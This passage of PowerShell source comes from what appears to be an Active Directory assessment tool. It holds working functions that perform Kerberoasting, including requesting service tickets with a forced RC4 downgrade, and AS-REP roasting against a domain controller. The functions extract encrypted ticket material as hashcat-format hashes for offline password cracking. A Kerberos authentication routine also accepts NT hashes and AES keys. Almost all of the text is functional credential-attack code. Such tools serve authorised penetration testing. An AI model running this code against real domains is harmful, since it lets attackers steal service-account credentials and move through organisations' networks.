	            Write-Error "[Invoke-Kerberoast] Either -SAMAccountName, -SPN, or pipeline input required"
	            return
	        }
	    }
	    if ($Script:UseInMemoryMethod) {
	        return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Credential -Username $Username -Password $Password
	    }
	    else {
	        $apiResult = Invoke-KerberoastWindowsAPI -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -CleanupTickets:$CleanupTickets
	        if (-not $apiResult.Success -and $apiResult.Error -match 'NetworkCredentials|TGT in cache|Re-authenticate') {
	            if ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
	                return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Script:LDAPContext['Credential']
	            }
	        }
	        return $apiResult
	    }
	}
	end {
	}
}
function Invoke-KerberoastWindowsAPI {
	param(
	    [string]$SAMAccountName,
	    [string]$SPN,
	    [switch]$CleanupTickets
	)
	try {
	    $KerberosToken = $null
	    $TicketBytes = $null
	    try {
	        $KerberosToken = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
	        $ApReqBytes = $KerberosToken.GetRequest()
	        if ($ApReqBytes -and $ApReqBytes.Length -gt 0) {
	            $TicketBytes = Get-TicketFromApReq -ApReqBytes $ApReqBytes
	            if (-not $TicketBytes) {
	                throw "Failed to extract Ticket from AP-REQ"
	            }
	        } else {
	            throw "GetRequest() returned empty AP-REQ"
	        }
	    } catch {
	        $errorMessage = $_.Exception.Message
	        $innerMessage = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $null }
	        $fullError = if ($innerMessage) { "$errorMessage - $innerMessage" } else { $errorMessage }
	        $userFriendlyError = $null
	        if ($fullError -match 'NetworkCredentials|unable to create.*Kerberos credential|No credentials are available') {
	            $userFriendlyError = "No valid Kerberos TGT in cache. Re-authenticate with Connect-adPEAS or use -Credential parameter for in-memory Kerberoasting."
	        }
	        elseif ($fullError -match 'target principal name is incorrect|cannot find') {
	            $userFriendlyError = "SPN not found or unreachable: $SPN"
	        }
	        elseif ($fullError -match 'KDC.*unavailable|cannot contact|network path') {
	            $userFriendlyError = "Cannot contact KDC. Check network connectivity and DNS."
	        }
	        return [PSCustomObject]@{
	            SAMAccountName = $SAMAccountName
	            SPN = $SPN
	            Success = $false
	            EncryptionType = $null
	            EncryptionTypeName = $null
	            Severity = $null
	            HashcatMode = $null
	            Hash = $null
	            Error = if ($userFriendlyError) { $userFriendlyError } else { "TGS request failed: $fullError" }
	        }
	    }
	    $EncryptionType = $null
	    $EncryptionTypeName = $null
	    $Severity = $null
	    $HashcatMode = $null
	    $TicketHash = $null
	    $TicketFound = $false
	    $RealmName = "UNKNOWN"
	    if ($Script:LDAPContext -and $Script:LDAPContext.distinguishedName) {
	        $RealmName = ($Script:LDAPContext.distinguishedName -replace 'DC=','' -replace ',','.').ToUpper()
	    } elseif ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
	        $RealmName = $Script:LDAPContext.Domain.ToUpper()
	    }
	    if ($TicketBytes -and $TicketBytes.Length -gt 0) {
	        $TicketFound = $true
	        $EncryptionType = Get-EncryptionTypeFromTicket -TicketBytes $TicketBytes
	        if ($EncryptionType) {
	            $etypeInt = [int]$EncryptionType
	            if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
	                $EncryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Name
	                $Severity = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Severity
	                $HashcatMode = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].HashcatMode
	            } else {
	                $EncryptionTypeName = "Unknown (etype $etypeInt)"
	                $Severity = "Unknown"
	            }
	        } else {
	        }
	        $TicketHash = Get-KerberosTicketHash -TicketBytes $TicketBytes -EncryptionType $EncryptionType -UserName $SAMAccountName -Realm $RealmName -SPN $SPN -TicketType "TGS"
	        if ($TicketHash) {
	        }
	    }
	    $Result = [PSCustomObject]@{
	        SAMAccountName = $SAMAccountName
	        SPN = $SPN
	        Success = $TicketFound
	        EncryptionType = $EncryptionType
	        EncryptionTypeName = $EncryptionTypeName
	        Severity = $Severity
	        HashcatMode = $HashcatMode
	        Hash = $TicketHash
	        Error = if (-not $TicketFound) { "Failed to extract ticket" } else { $null }
	    }
	    if ($EncryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey([int]$EncryptionType)) {
	        $Result | Add-Member -NotePropertyName "Description" -NotePropertyValue $Script:KERBEROS_ENCRYPTION_TYPES[[int]$EncryptionType].Description
	    }
	    if ($CleanupTickets) {
	        Write-Warning "[Invoke-Kerberoast] CleanupTickets requested but selective deletion not supported by klist. Use 'klist purge' manually if full cleanup is intended."
	    }
	    return $Result
	} catch {
	    return [PSCustomObject]@{
	        SAMAccountName = $SAMAccountName
	        SPN = $SPN
	        Success = $false
	        EncryptionType = $null
	        EncryptionTypeName = $null
	        Severity = $null
	        HashcatMode = $null
	        Hash = $null
	        Error = $_.Exception.Message
	    }
	}
}
function Get-TicketFromApReq {
	param([byte[]]$ApReqBytes)
	try {
	    $offset = 0
	    if ($ApReqBytes[$offset] -eq 0x60) {
	        $offset++
	        if ($ApReqBytes[$offset] -band 0x80) {
	            $lenBytes = $ApReqBytes[$offset] -band 0x7F
	            $offset += 1 + $lenBytes
	        } else {
	            $offset++
	        }
	        if ($ApReqBytes[$offset] -eq 0x06) {
	            $offset++
	            $oidLen = $ApReqBytes[$offset]
	            $offset += 1 + $oidLen
	        }
	        if ($offset + 2 -lt $ApReqBytes.Length -and $ApReqBytes[$offset] -eq 0x01 -and $ApReqBytes[$offset + 1] -eq 0x00) {
	            $offset += 2
	        }
	    }
	    if ($ApReqBytes[$offset] -ne 0x6E) {
	        return $null
	    }
	    $offset++
	    if ($ApReqBytes[$offset] -band 0x80) {
	        $lenBytes = $ApReqBytes[$offset] -band 0x7F
	        $offset += 1 + $lenBytes
	    } else {
	        $offset++
	    }
	    if ($ApReqBytes[$offset] -ne 0x30) {
	        return $null
	    }
	    $offset++
	    if ($ApReqBytes[$offset] -band 0x80) {
	        $lenBytes = $ApReqBytes[$offset] -band 0x7F
	        $offset += 1 + $lenBytes
	    } else {
	        $offset++
	    }
	    while ($offset -lt $ApReqBytes.Length - 10) {
	        $tag = $ApReqBytes[$offset]
	        if ($tag -eq 0xA3) {
	            $offset++
	            $ticketWrapperLen = 0
	            if ($ApReqBytes[$offset] -band 0x80) {
	                $lenBytes = $ApReqBytes[$offset] -band 0x7F
	                $offset++
	                for ($i = 0; $i -lt $lenBytes; $i++) {
	                    $ticketWrapperLen = ($ticketWrapperLen -shl 8) -bor $ApReqBytes[$offset + $i]
	                }
	                $offset += $lenBytes
	            } else {
	                $ticketWrapperLen = $ApReqBytes[$offset]
	                $offset++
	            }
	            if ($ApReqBytes[$offset] -eq 0x61) {
	                $ticketBytes = New-Object byte[] $ticketWrapperLen
	                [Array]::Copy($ApReqBytes, $offset, $ticketBytes, 0, $ticketWrapperLen)
	                return $ticketBytes
	            } else {
	                return $null
	            }
	        }
	        $offset++
	        if ($offset -lt $ApReqBytes.Length) {
	            $elementLen = 0
	            if ($ApReqBytes[$offset] -band 0x80) {
	                $lenBytes = $ApReqBytes[$offset] -band 0x7F
	                $offset++
	                for ($i = 0; $i -lt $lenBytes; $i++) {
	                    if ($offset + $i -lt $ApReqBytes.Length) {
	                        $elementLen = ($elementLen -shl 8) -bor $ApReqBytes[$offset + $i]
	                    }
	                }
	                $offset += $lenBytes + $elementLen
	            } else {
	                $elementLen = $ApReqBytes[$offset]
	                $offset += 1 + $elementLen
	            }
	        }
	    }
	    return $null
	}
	catch {
	    return $null
	}
}
function Get-EncryptionTypeFromTicket {
	param([byte[]]$TicketBytes)
	try {
	    $offset = 0
	    if ($TicketBytes[$offset] -ne 0x61) {
	        return $null
	    }
	    $offset++
	    if ($TicketBytes[$offset] -band 0x80) {
	        $lenBytes = $TicketBytes[$offset] -band 0x7F
	        $offset += 1 + $lenBytes
	    } else {
	        $offset++
	    }
	    if ($TicketBytes[$offset] -ne 0x30) {
	        return $null
	    }
	    $offset++
	    if ($TicketBytes[$offset] -band 0x80) {
	        $lenBytes = $TicketBytes[$offset] -band 0x7F
	        $offset += 1 + $lenBytes
	    } else {
	        $offset++
	    }
	    while ($offset -lt $TicketBytes.Length - 10) {
	        if ($TicketBytes[$offset] -eq 0xA3) {
	            $offset++
	            if ($TicketBytes[$offset] -band 0x80) {
	                $lenBytes = $TicketBytes[$offset] -band 0x7F
	                $offset += 1 + $lenBytes
	            } else {
	                $offset++
	            }
	            if ($TicketBytes[$offset] -ne 0x30) {
	                return $null
	            }
	            $offset++
	            if ($TicketBytes[$offset] -band 0x80) {
	                $lenBytes = $TicketBytes[$offset] -band 0x7F
	                $offset += 1 + $lenBytes
	            } else {
	                $offset++
	            }
	            if ($TicketBytes[$offset] -ne 0xA0) {
	                return $null
	            }
	            $offset++
	            if ($TicketBytes[$offset] -band 0x80) {
	                $lenBytes = $TicketBytes[$offset] -band 0x7F
	                $offset += 1 + $lenBytes
	            } else {
	                $offset++
	            }
	            if ($TicketBytes[$offset] -ne 0x02) {
	                return $null
	            }
	            $offset++
	            $intLen = $TicketBytes[$offset]
	            $offset++
	            $etype = 0
	            for ($i = 0; $i -lt $intLen; $i++) {
	                $etype = ($etype -shl 8) -bor $TicketBytes[$offset + $i]
	            }
	            return $etype
	        }
	        $offset++
	        if ($offset -lt $TicketBytes.Length -and ($TicketBytes[$offset] -band 0x80)) {
	            $lenBytes = $TicketBytes[$offset] -band 0x7F
	            if ($lenBytes -gt 0 -and ($offset + 1 + $lenBytes) -lt $TicketBytes.Length) {
	                $elementLen = 0
	                for ($i = 0; $i -lt $lenBytes; $i++) {
	                    $elementLen = ($elementLen -shl 8) -bor $TicketBytes[$offset + 1 + $i]
	                }
	                $offset += 1 + $lenBytes + $elementLen
	            } else {
	                $offset++
	            }
	        } elseif ($offset -lt $TicketBytes.Length) {
	            $elementLen = $TicketBytes[$offset]
	            $offset += 1 + $elementLen
	        }
	    }
	    return $null
	}
	catch {
	    return $null
	}
}
function Invoke-KerberoastInMemory {
	param(
	    [string]$SAMAccountName,
	    [string]$SPN,
	    [string]$Domain,
	    [string]$Server,
	    [System.Management.Automation.PSCredential]$Credential,
	    [string]$Username,
	    [string]$Password
	)
	$securePassword = $null
	$tgtResult = $null
	try {
	    $targetDomain = $Domain
	    if (-not $targetDomain -and $Script:LDAPContext -and $Script:LDAPContext.Domain) {
	        $targetDomain = $Script:LDAPContext.Domain
	    }
	    if (-not $targetDomain) {
	        throw "Domain not specified. Use -Domain parameter or connect with Connect-adPEAS first."
	    }
	    $targetServer = $Server
	    if (-not $targetServer -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
	        $targetServer = $Script:LDAPContext.Server
	    }
	    if (-not $targetServer) {
	        $dcResolution = Resolve-adPEASName -Domain $targetDomain
	        if ($dcResolution -and $dcResolution.Hostname) {
	            $targetServer = $dcResolution.Hostname
	        } else {
	            throw "Could not resolve domain controller for '$targetDomain'. Use -Server parameter or connect with Connect-adPEAS first."
	        }
	    }
	    $realmUpper = $targetDomain.ToUpper()
	    $effectiveCredential = $null
	    if ($Credential) {
	        $effectiveCredential = $Credential
	    }
	    elseif ($Username -and $Password) {
	        $securePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
	        $effectiveCredential = [System.Management.Automation.PSCredential]::new($Username, $securePass)
	    }
	    elseif ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
	        $effectiveCredential = $Script:LDAPContext['Credential']
	    }
	    else {
	        throw "No credentials available. Use -Credential, -Username/-Password parameters, or connect with Connect-adPEAS -Credential first."
	    }
	    $authUserName = $effectiveCredential.UserName
	    if ($authUserName -match '\\') {
	        $authUserName = $authUserName.Split('\')[1]
	    }
	    if ($authUserName -match '@') {
	        $authUserName = $authUserName.Split('@')[0]
	    }
	    $tgtResult = Invoke-KerberosAuth -UserName $authUserName -Domain $targetDomain -DomainController $targetServer -Credential $effectiveCredential
	    if (-not $tgtResult.Success) {
	        throw "Failed to obtain TGT: $($tgtResult.Error)"
	    }
	    $tgsResult = $null
	    $lastError = $null
	    try {
	        $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
	                                           -SessionKey $tgtResult.SessionKeyBytes `
	                                           -SessionKeyType $tgtResult.EncryptionType `
	                                           -ServicePrincipalName $SPN `
	                                           -Domain $targetDomain `
	                                           -DomainController $targetServer `
	                                           -UserName $authUserName `
	                                           -DowngradeToRC4
	        if (-not $tgsResult.Success -and $tgsResult.Error -match 'ETYPE_NOSUPP') {
	            $tgsResult = Request-ServiceTicket -TGT $tgtResult.TicketBytes `
	                                               -SessionKey $tgtResult.SessionKeyBytes `
	                                               -SessionKeyType $tgtResult.EncryptionType `
	                                               -ServicePrincipalName $SPN `
	                                               -Domain $targetDomain `
	                                               -DomainController $targetServer `
	                                               -UserName $authUserName
	        }
	        if ($tgsResult.Success) {
	        } else {
	            $lastError = $tgsResult.Error
	        }
	    }
	    catch {
	        $lastError = $_.Exception.Message
	    }
	    if ($tgsResult -and $tgsResult.Success) {
	        $hash = Get-KerberosTicketHash -TicketBytes $tgsResult.TicketBytes `
	                                       -EncryptionType $tgsResult.EncryptionType `
	                                       -UserName $SAMAccountName `
	                                       -Realm $realmUpper `
	                                       -SPN $SPN `
	                                       -TicketType "TGS"
	        $etypeInfo = $null
	        $etypeInt = [int]$tgsResult.EncryptionType
	        if ($Script:KERBEROS_ENCRYPTION_TYPES -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
	            $etypeInfo = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt]
	        }
	        if ($hash) {
	        } else {
	        }
	        return [PSCustomObject]@{
	            SAMAccountName = $SAMAccountName
	            SPN = $SPN
	            Success = $true
	            EncryptionType = $etypeInt
	            EncryptionTypeName = if ($etypeInfo) { $etypeInfo.Name } else { "etype $etypeInt" }
	            Severity = if ($etypeInfo) { $etypeInfo.Severity } else { "Unknown" }
	            HashcatMode = if ($etypeInfo) { $etypeInfo.HashcatMode } else { $null }
	            Hash = $hash
	            Error = $null
	        }
	    } else {
	        return [PSCustomObject]@{
	            SAMAccountName = $SAMAccountName
	            SPN = $SPN
	            Success = $false
	            EncryptionType = $null
	            EncryptionTypeName = $null
	            Severity = $null
	            HashcatMode = $null
	            Hash = $null
	            Error = if ($lastError) { $lastError } else { "Unknown error" }
	        }
	    }
	}
	catch {
	    return [PSCustomObject]@{
	        SAMAccountName = $SAMAccountName
	        SPN = $SPN
	        Success = $false
	        EncryptionType = $null
	        EncryptionTypeName = $null
	        Severity = $null
	        HashcatMode = $null
	        Hash = $null
	        Error = $_.Exception.Message
	    }
	}
	finally {
	    if ($securePassword) {
	        try { $securePassword.Dispose() } catch { }
	    }
	    if ($tgtResult) {
	        if ($tgtResult.TicketBytes) {
	            [Array]::Clear($tgtResult.TicketBytes, 0, $tgtResult.TicketBytes.Length)
	        }
	        if ($tgtResult.SessionKeyBytes) {
	            [Array]::Clear($tgtResult.SessionKeyBytes, 0, $tgtResult.SessionKeyBytes.Length)
	        }
	    }
	}
}
function Invoke-ASREPRoast {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$SAMAccountName,
	    [Parameter(Mandatory=$false)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$DomainController
	)
	begin {
	    function New-KerberosASREQ {
	        param(
	            [string]$Username,
	            [string]$Realm
	        )
	        $pvno = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value @(5))
	        $msgType = New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value @(10))
	        $kdcOptions = @(0x03, 0x05, 0x00, 0x40, 0x80, 0x00, 0x10)
	        $kdcOptionsTag = New-ASN1ContextTag -Tag 0 -Data $kdcOptions
	        $nameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(1))
	        $nameString = New-ASN1Sequence -Data (New-ASN1GeneralString -Value $Username)
	        $nameStringTag = New-ASN1ContextTag -Tag 1 -Data $nameString
	        $principalName = New-ASN1Sequence -Data ($nameType + $nameStringTag)
	        $cnameTag = New-ASN1ContextTag -Tag 1 -Data $principalName
	        $realmTag = New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $Realm.ToUpper())
	        $snameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(2))  # NT-SRV-INST
	        $snameString1 = New-ASN1GeneralString -Value "krbtgt"
	        $snameString2 = New-ASN1GeneralString -Value $Realm.ToUpper()
	        $snameStringSeq = New-ASN1Sequence -Data ($snameString1 + $snameString2)
	        $snameStringTag = New-ASN1ContextTag -Tag 1 -Data $snameStringSeq
	        $snamePrincipal = New-ASN1Sequence -Data ($snameType + $snameStringTag)
	        $snameTag = New-ASN1ContextTag -Tag 3 -Data $snamePrincipal
	        $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
	        $tillTag = New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)
	        $nonce = Get-Random -Minimum 1 -Maximum 2147483647
	        $nonceBytes = [System.BitConverter]::GetBytes([uint32]$nonce)
	        [Array]::Reverse($nonceBytes)
	        $nonceTag = New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonceBytes)
	        $etype23 = New-ASN1Integer -Value @(23)
	        $etype18 = New-ASN1Integer -Value @(18)
	        $etype17 = New-ASN1Integer -Value @(17)
	        $etypeSeq = New-ASN1Sequence -Data ($etype23 + $etype18 + $etype17)
	        $etypeTag = New-ASN1ContextTag -Tag 8 -Data $etypeSeq
	        $kdcReqBody = $kdcOptionsTag + $cnameTag + $realmTag + $snameTag + $tillTag + $nonceTag + $etypeTag
	        $kdcReqBodySeq = New-ASN1Sequence -Data $kdcReqBody
	        $kdcReqBodyTag = New-ASN1ContextTag -Tag 4 -Data $kdcReqBodySeq
	        $asReq = $pvno + $msgType + $kdcReqBodyTag
	        $asReqSeq = New-ASN1Sequence -Data $asReq
	        $asReqApp = New-ASN1ApplicationTag -Tag 10 -Data $asReqSeq
	        return $asReqApp
	    }
	}
	process {
	    try {
	        if (-not $Domain) {
	            if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
	                $Domain = $Script:LDAPContext.Domain
	            } else {
	                Write-Error "[Invoke-ASREPRoast] -Domain is required when no active session exists. Use Connect-adPEAS first or provide -Domain."
	                return [PSCustomObject]@{
	                    SAMAccountName = $SAMAccountName
	                    Success = $false
	                    EncryptionType = $null
	                    EncryptionTypeName = "N/A"
	                    Severity = "Unknown"
	                    Hash = $null
	                    Error = "No domain specified and no active session. Use Connect-adPEAS first or provide -Domain."
	                }
	            }
	        }
	        if (-not $DomainController -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
	            $DomainController = $Script:LDAPContext.Server
	        }
	        if ($DomainController) {
	            $ResolvedIP = Resolve-adPEASName -Name $DomainController
	            $dcResolution = [PSCustomObject]@{ Hostname = $DomainController; IP = $ResolvedIP }
	        } else {
	            $dcResolution = Resolve-adPEASName -Domain $Domain
	        }
	        $DomainController = $dcResolution.Hostname
	        $ResolvedIP = $dcResolution.IP
	        $KdcTarget = if ($ResolvedIP) { $ResolvedIP } else { $DomainController }
	        $asReqBytes = New-KerberosASREQ -Username $SAMAccountName -Realm $Domain
	        $responseBytes = $null
	        $success = $false
	        $tcpClient = $null
	        $stream = $null
	        try {
	            $tcpClient = New-Object System.Net.Sockets.TcpClient
	            $tcpClient.ReceiveTimeout = 5000
	            $tcpClient.SendTimeout = 5000
	            $tcpClient.Connect($KdcTarget, 88)
	            $stream = $tcpClient.GetStream()
	            $stream.ReadTimeout = 5000
	            $stream.WriteTimeout = 5000
	            $lengthBytes = [System.BitConverter]::GetBytes([uint32]$asReqBytes.Length)
	            [Array]::Reverse($lengthBytes)
	            $stream.Write($lengthBytes, 0, 4)
	            $stream.Write($asReqBytes, 0, $asReqBytes.Length)
	            $stream.Flush()
	            $responseLengthBytes = New-Object byte[] 4
	            $readCount = $stream.Read($responseLengthBytes, 0, 4)
	            if ($readCount -ne 4) {
	                throw "Failed to read response length header (got $readCount bytes)"
	            }
	            [Array]::Reverse($responseLengthBytes)
	            $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)
	            if ($responseLength -eq 0 -or $responseLength -gt 65535) {
	                throw "Invalid response length: $responseLength"
	            }
	            $responseBytes = New-Object byte[] $responseLength
	            $bytesRead = 0
	            while ($bytesRead -lt $responseLength) {
	                $chunk = $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
	                if ($chunk -eq 0) {
	                    throw "Connection closed while reading response (got $bytesRead of $responseLength bytes)"
	                }
	                $bytesRead += $chunk
	            }
	            $success = $true
	        } catch {
	        } finally {
	            if ($stream) { try { $stream.Close() } catch { } }
	            if ($tcpClient) { try { $tcpClient.Close() } catch { } }
	        }
	        if (-not $success) {
	            $udpClient = $null
	            try {
	                $udpClient = New-Object System.Net.Sockets.UdpClient
	                $udpClient.Client.ReceiveTimeout = 5000
	                $udpClient.Client.SendTimeout = 5000
	                $udpClient.Send($asReqBytes, $asReqBytes.Length, $KdcTarget, 88) | Out-Null
	                $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
	                $responseBytes = $udpClient.Receive([ref]$remoteEP)
	                if ($responseBytes -and $responseBytes.Length -gt 0) {
	                    $success = $true
	                }
	            } catch {
	            } finally {
	                if ($udpClient) { try { $udpClient.Close() } catch { } }
	            }
	        }
	        if (-not $success) {
	            return [PSCustomObject]@{
	                SAMAccountName = $SAMAccountName
	                Success = $false
	                EncryptionType = $null
	                EncryptionTypeName = "N/A"
	                Severity = "Unknown"
	                Hash = $null
	                Error = "Failed to receive AS-REP response from KDC (TCP and UDP failed)"
	            }
	        }
	        if ($responseBytes.Length -gt 2 -and $responseBytes[0] -eq 0x7E) {
	            $errorCode = $null
	            try {
	                $krbError = Read-ASN1Element -Data $responseBytes -Offset 0
	                if ($krbError -and $krbError.Content) {
	                    $innerSeq = Read-ASN1Element -Data $krbError.Content -Offset 0
	                    if ($innerSeq -and $innerSeq.Content) {
	                        $children = Read-ASN1Children -Data $innerSeq.Content
	                        foreach ($child in $children) {
	                            if ($child.TagNumber -eq 6) {
	                                $intElement = Read-ASN1Element -Data $child.Content -Offset 0
	                                if ($intElement -and $intElement.Content) {
	                                    $errorCode = [int](Read-ASN1Integer -Content $intElement.Content)
	                                }
	                                break
	                            }
	                        }
	                    }
	                }
	            } catch {
	            }
	            $errorMessage = Get-KerberosErrorMessage -ErrorCode $errorCode
	            return [PSCustomObject]@{
	                SAMAccountName = $SAMAccountName
	                Success = $false
	                EncryptionType = $null
	                EncryptionTypeName = "N/A"
	                Severity = "Unknown"
	                Hash = $null
	                Error = $errorMessage
	            }
	        }
	        $encryptionType = $null
	        $encryptedPart = $null
	        try {
	            $root = Read-ASN1Element -Data $responseBytes -Offset 0
	            if (($root.Tag -band 0x1F) -ne 11) {
	                throw "Unexpected response type: $($root.Tag)"
	            }
	            $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	            $children = Read-ASN1Children -Data $innerSeq.Content
	            foreach ($child in $children) {
	                if ($child.TagNumber -eq 6) {
	                    $encPartSeq = Read-ASN1Element -Data $child.Content
	                    $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content
	                    foreach ($encChild in $encPartChildren) {
	                        if ($encChild.TagNumber -eq 0) {
	                            $encryptionType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
	                        }
	                        elseif ($encChild.TagNumber -eq 2) {
	                            $encryptedPart = (Read-ASN1Element -Data $encChild.Content).Content
	                        }
	                    }
	                }
	            }
	        }
	        catch {
	        }
	        if (-not $encryptedPart -or -not $encryptionType) {
	            return [PSCustomObject]@{
	                SAMAccountName = $SAMAccountName
	                Success = $false
	                EncryptionType = $encryptionType
	                EncryptionTypeName = if ($encryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
	                Severity = "Unknown"
	                Hash = $null
	                Error = "Failed to extract encrypted part from AS-REP"
	            }
	        }
	        $checksumLength = if ($encryptionType -eq 23) { $Script:HMAC_MD5_SIZE } else { $Script:AES_CHECKSUM_SIZE }
	        if ($encryptedPart.Length -lt $checksumLength) {
	            return [PSCustomObject]@{
	                SAMAccountName = $SAMAccountName
	                Success = $false
	                EncryptionType = $encryptionType
	                EncryptionTypeName = if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
	                Severity = "Unknown"
	                Hash = $null
	                Error = "Encrypted part too short"
	            }
	        }
	        if ($encryptionType -eq 23) {
	            $checksum = $encryptedPart[0..($checksumLength - 1)]
	            $encrypted = $encryptedPart[$checksumLength..($encryptedPart.Length - 1)]
	        } else {
	            $encrypted = $encryptedPart[0..($encryptedPart.Length - $checksumLength - 1)]
	            $checksum = $encryptedPart[($encryptedPart.Length - $checksumLength)..($encryptedPart.Length - 1)]
	        }
	        $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
	        $encryptedHex = ($encrypted | ForEach-Object { $_.ToString("x2") }) -join ''
	        $hash = "`$krb5asrep`$$encryptionType`$$SAMAccountName@$($Domain.ToUpper()):$checksumHex`$$encryptedHex"
	        $encryptionTypeName = "Unknown"
	        $severity = "Unknown"
	        $description = "Unknown encryption type"
	        if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) {
	            $encryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name
	            $severity = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Severity
	            $description = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Description
	        }
	        return [PSCustomObject]@{
	            SAMAccountName = $SAMAccountName
	            Success = $true
	            EncryptionType = $encryptionType
	            EncryptionTypeName = $encryptionTypeName
	            Severity = $severity
	            Description = $description
	            Hash = $hash
	            Error = $null
	        }
	    } catch {
	        return [PSCustomObject]@{
	            SAMAccountName = $SAMAccountName
	            Success = $false
	            EncryptionType = $null
	            EncryptionTypeName = "N/A"
	            Severity = "Unknown"
	            Hash = $null
	            Error = $_.Exception.Message
	        }
	    }
	}
	end {
	}
}
function Invoke-KerberosAuth {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true, Position=0)]
	    [string]$UserName,
	    [Parameter(Mandatory=$true, Position=1)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$DomainController,
	    [Parameter(Mandatory=$false)]
	    [System.Management.Automation.PSCredential]$Credential,
	    [Parameter(Mandatory=$false)]
	    [string]$Password,
	    [Parameter(Mandatory=$false)]
	    [ValidatePattern('^[0-9a-fA-F]{32}$')]
	    [string]$NTHash,
	    [Parameter(Mandatory=$false)]
	    [ValidatePattern('^[0-9a-fA-F]{64}$')]
	    [string]$AES256Key,
	    [Parameter(Mandatory=$false)]
	    [ValidatePattern('^[0-9a-fA-F]{32}$')]
	    [string]$AES128Key,
	    [Parameter(Mandatory=$false)]
	    $Certificate,  # Accepts X509Certificate2, string (file path), or string (Base64)
	    [Parameter(Mandatory=$false)]
	    [string]$CertificatePassword = "",
	    [Parameter(Mandatory=$false)]
	    [ValidateSet(18, 17, 23)]
	    [int]$PreferredEType = 18,
	    [Parameter(Mandatory=$false)]
	    [string]$OutputKirbi,
	    [Parameter(Mandatory=$false)]
	    [switch]$NoPAC,
	    [Parameter(Mandatory=$false)]
	    [switch]$OutputTicketOnly
	)
	begin {
	    $authMethods = @()
	    if ($Credential) { $authMethods += "Credential" }
	    if ($PSBoundParameters.ContainsKey('Password')) { $authMethods += "Password" }
	    if ($NTHash) { $authMethods += "NTHash" }
	    if ($AES256Key) { $authMethods += "AES256Key" }
	    if ($AES128Key) { $authMethods += "AES128Key" }
	    if ($Certificate) { $authMethods += "Certificate" }
	    if ($authMethods.Count -eq 0) {
	        throw "You must provide one authentication method: -Credential, -Password, -NTHash, -AES256Key, -AES128Key, or -Certificate"
	    }
	    if ($authMethods.Count -gt 1) {
	        throw "You can only provide one authentication method at a time. Provided: $($authMethods -join ', ')"
	    }
	    $AuthMethodType = $authMethods[0]
	    $CustomDnsServer = $null
	    if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
	        $CustomDnsServer = $Script:LDAPContext['DnsServer']
	    }
	    if (-not $DomainController) {
	        $dcResult = Resolve-adPEASName -Domain $Domain -DnsServer $CustomDnsServer
	        if ($dcResult.IP) {
	            $DomainController = $dcResult.IP
	        }
	        elseif ($dcResult.Hostname) {
	            $DomainController = $dcResult.Hostname
	        }
	        else {
	            $DomainController = $Domain
	        }
	    }
	    else {
	        if ($CustomDnsServer) {
	            $ipTest = $null
	            if (-not [System.Net.IPAddress]::TryParse($DomainController, [ref]$ipTest)) {
	                $ResolvedIP = Resolve-adPEASName -Name $DomainController -DnsServer $CustomDnsServer
	                if ($ResolvedIP) {
	                    $DomainController = $ResolvedIP
	                }
	            }
	        }
	    }
	    function New-PAEncTimestamp {
	        param(
	            [byte[]]$Key,
	            [int]$EType
	        )
	        $now = [datetime]::UtcNow
	        $pausec = $now.Millisecond * 1000
	        $paEncTsEnc = @()
	        $paEncTsEnc += New-ASN1ContextTag -Tag 0 -Data (New-ASN1GeneralizedTime -Value $now)
